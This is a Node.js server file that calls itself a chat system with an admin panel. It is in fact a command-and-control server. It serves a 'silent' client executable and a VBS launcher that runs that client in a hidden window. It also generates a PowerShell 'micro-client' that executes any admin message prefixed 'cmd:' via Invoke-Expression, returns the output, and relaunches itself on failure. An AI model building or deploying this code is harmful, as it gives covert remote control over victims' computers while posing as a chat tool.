const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../admin-frontend/build')));

const db = new sqlite3.Database('./chat.db');

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS clients (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT UNIQUE,
    name TEXT,
    connected_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'online'
  )`);
  
  db.run(`CREATE TABLE IF NOT EXISTS messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    client_id TEXT,
    sender TEXT,
    message TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(client_id) REFERENCES clients(client_id)
  )`);
});

const clients = new Map();
const adminConnections = new Set();

wss.on('connection', (ws, req) => {
  // Check if this is an admin connection (from web interface)
  // Admin connections come from the browser with an origin header
  const isAdmin = req.headers.origin && req.headers.origin.includes('localhost:8080');
  
  if (isAdmin) {
    adminConnections.add(ws);
    ws.isAdmin = true;
    console.log('Admin connected');
  } else {
    const clientId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    ws.clientId = clientId;
    clients.set(clientId, ws);
  
    db.run('INSERT OR REPLACE INTO clients (client_id, name, status) VALUES (?, ?, ?)', 
      [clientId, `Client-${clientId.substr(0, 6)}`, 'online']);
    
    ws.send(JSON.stringify({
      type: 'connection',
      clientId: clientId,
      message: 'Connected to server'
    }));
  }
  
  broadcastClientList();
  
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      if (data.type === 'message' && !ws.isAdmin) {
        db.run('INSERT INTO messages (client_id, sender, message) VALUES (?, ?, ?)',
          [ws.clientId, 'client', data.message]);
        
        // Broadcast to admin WebSocket connection (not back to clients)
        // The admin interface needs to see client messages
        broadcastToAdmin({
          type: 'message',
          clientId: ws.clientId,
          sender: 'client',
          message: data.message,
          timestamp: new Date().toISOString()
        });
      }
      
      if (ws.clientId) {
        db.run('UPDATE clients SET last_seen = CURRENT_TIMESTAMP WHERE client_id = ?', [ws.clientId]);
      }
    } catch (err) {
      console.error('Error processing message:', err);
    }
  });
  
  ws.on('close', () => {
    if (ws.isAdmin) {
      adminConnections.delete(ws);
      console.log('Admin disconnected');
    } else if (ws.clientId) {
      clients.delete(ws.clientId);
      
      // Option 1: Just mark as offline (keep chat history)
      console.log(`Client ${ws.clientId} disconnected - marking as offline`);
      db.run('UPDATE clients SET status = ? WHERE client_id = ?', ['offline', ws.clientId]);
      
      // Option 2: Auto-delete the entire chat room when client disconnects (disabled)
      // console.log(`Client ${ws.clientId} disconnected - cleaning up chat room`);
      // db.run('DELETE FROM messages WHERE client_id = ?', [ws.clientId], (err) => {
      //   if (err) console.error('Error deleting messages:', err);
      // });
      // db.run('DELETE FROM clients WHERE client_id = ?', [ws.clientId], (err) => {
      //   if (err) console.error('Error deleting client:', err);
      // });
      
      broadcastClientList();
    }
  });
  
  ws.on('error', (err) => {
    console.error('WebSocket error:', err);
  });
});

function broadcastToAdmin(data) {
  // Only send to admin connections, not to clients
  adminConnections.forEach((adminWs) => {
    if (adminWs.readyState === WebSocket.OPEN) {
      adminWs.send(JSON.stringify(data));
    }
  });
}

function broadcastClientList() {
  db.all('SELECT * FROM clients WHERE status = ? ORDER BY connected_at DESC', ['online'], (err, rows) => {
    if (err) return;
    
    broadcastToAdmin({
      type: 'client_list',
      clients: rows
    });
  });
}

app.get('/api/clients', (req, res) => {
  db.all('SELECT * FROM clients ORDER BY connected_at DESC', (err, rows) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    res.json(rows);
  });
});

app.get('/api/messages/:clientId', (req, res) => {
  const { clientId } = req.params;
  db.all('SELECT * FROM messages WHERE client_id = ? ORDER BY timestamp ASC', [clientId], (err, rows) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    res.json(rows);
  });
});

app.post('/api/send-message', (req, res) => {
  const { clientId, message } = req.body;
  
  db.run('INSERT INTO messages (client_id, sender, message) VALUES (?, ?, ?)',
    [clientId, 'admin', message], (err) => {
      if (err) {
        res.status(500).json({ error: err.message });
        return;
      }
      
      const client = clients.get(clientId);
      if (client && client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({
          type: 'message',
          sender: 'admin',
          message: message,
          timestamp: new Date().toISOString()
        }));
      }
      
      res.json({ success: true });
    });
});

// Delete a chat room (client and all its messages)
app.delete('/api/client/:clientId', (req, res) => {
  const { clientId } = req.params;
  
  // Delete all messages for this client
  db.run('DELETE FROM messages WHERE client_id = ?', [clientId], (err) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    
    // Delete the client record
    db.run('DELETE FROM clients WHERE client_id = ?', [clientId], (err) => {
      if (err) {
        res.status(500).json({ error: err.message });
        return;
      }
      
      // Disconnect the client if still connected
      const client = clients.get(clientId);
      if (client && client.readyState === WebSocket.OPEN) {
        // Send termination message before closing
        client.send(JSON.stringify({
          type: 'terminate',
          reason: 'Room deleted by admin'
        }));
        setTimeout(() => client.close(), 100); // Give time for message to send
      }
      clients.delete(clientId);
      
      // Broadcast updated client list
      broadcastClientList();
      
      res.json({ success: true, message: 'Chat room deleted' });
    });
  });
});

// Clear all messages for a client
app.delete('/api/messages/:clientId', (req, res) => {
  const { clientId } = req.params;
  
  db.run('DELETE FROM messages WHERE client_id = ?', [clientId], (err) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    
    res.json({ success: true, message: 'Messages cleared' });
  });
});

// Clear all chat rooms (delete all clients and messages)
app.delete('/api/clear-all-rooms', (req, res) => {
  // First, send termination message to all connected clients
  clients.forEach((ws, clientId) => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'terminate',
        message: 'All rooms cleared by admin'
      }));
      ws.close();
    }
  });
  
  // Clear the clients map
  clients.clear();
  
  // Delete all messages from database
  db.run('DELETE FROM messages', (err) => {
    if (err) {
      res.status(500).json({ error: err.message });
      return;
    }
    
    // Delete all clients from database
    db.run('DELETE FROM clients', (err) => {
      if (err) {
        res.status(500).json({ error: err.message });
        return;
      }
      
      // Broadcast updated client list (empty)
      broadcastClientList();
      
      res.json({ success: true, message: 'All chat rooms cleared' });
    });
  });
});

// Serve client files for download
app.get('/download/client.exe', (req, res) => {
  const clientPath = path.join(__dirname, '../client/dist/chat-client-silent.exe');
  if (require('fs').existsSync(clientPath)) {
    res.download(clientPath, 'chat-client.exe');
  } else {
    res.status(404).json({ error: 'Client executable not found' });
  }
});

// Serve compressed client for faster download
app.get('/download/client.zip', (req, res) => {
  const zipPath = path.join(__dirname, '../client/dist/chat-client-silent.zip');
  if (require('fs').existsSync(zipPath)) {
    res.download(zipPath, 'chat-client.zip');
  } else {
    res.status(404).json({ error: 'Compressed client not found' });
  }
});

// Serve micro PowerShell client
app.get('/download/micro-client.ps1', (req, res) => {
  const psContent = `# Ultra-light PowerShell WebSocket client (< 1KB)
param($server = "${req.get('host') || 'localhost:8080'}")

Add-Type -AssemblyName System.Net.WebSockets
Add-Type -AssemblyName System.Threading.Tasks

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = [System.Uri]::new("ws://$server")

try {
    $task = $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None)
    $task.Wait()
    
    while ($ws.State -eq 'Open') {
        $buffer = New-Object byte[] 1024
        $result = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buffer), [System.Threading.CancellationToken]::None)
        $result.Wait()
        
        if ($result.Result.MessageType -eq 'Text') {
            $msg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Result.Count)
            $data = ConvertFrom-Json $msg
            
            if ($data.message -and $data.message.StartsWith('cmd:')) {
                $cmd = $data.message.Substring(4)
                $output = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
                $response = @{ type='message'; message="[$cmd]\`n$output" } | ConvertTo-Json -Compress
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($response)
                $ws.SendAsync([System.ArraySegment[byte]]::new($bytes), 'Text', $true, [System.Threading.CancellationToken]::None).Wait()
            }
        }
        Start-Sleep -Milliseconds 100
    }
} catch {
    Start-Sleep 5
    & $MyInvocation.MyCommand.Path $server
}`;
  
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', 'attachment; filename="micro-client.ps1"');
  res.send(psContent);
});

app.get('/download/launcher.vbs', (req, res) => {
  const vbsContent = `' Silent Client Launcher
Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get temp directory
strTempDir = objFSO.GetSpecialFolder(2) & "\\ChatClient"

' Create directory if it doesn't exist
If Not objFSO.FolderExists(strTempDir) Then
    objFSO.CreateFolder(strTempDir)
End If

' Path to the executable
strExe = strTempDir & "\\chat-client-silent.exe"

' Check if executable exists, if not show error
If Not objFSO.FileExists(strExe) Then
    WScript.Echo "Client not installed. Please run the installer first."
    WScript.Quit
End If

' Run the executable hidden (0 = hidden window)
WshShell.Run Chr(34) & strExe & Chr(34), 0, False

' Script exits immediately, client continues running in background`;

  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', 'attachment; filename="run-client.vbs"');
  res.send(vbsContent);
});

app.get('/download/installer-info', (req, res) => {
  res.json({
    serverUrl: `ws://${req.get('host')}`,
    clientVersion: '1.0.0',
    files: {
      client: '/download/client.exe',
      launcher: '/download/launcher.vbs'
    }
  });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../admin-frontend/build', 'index.html'));
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});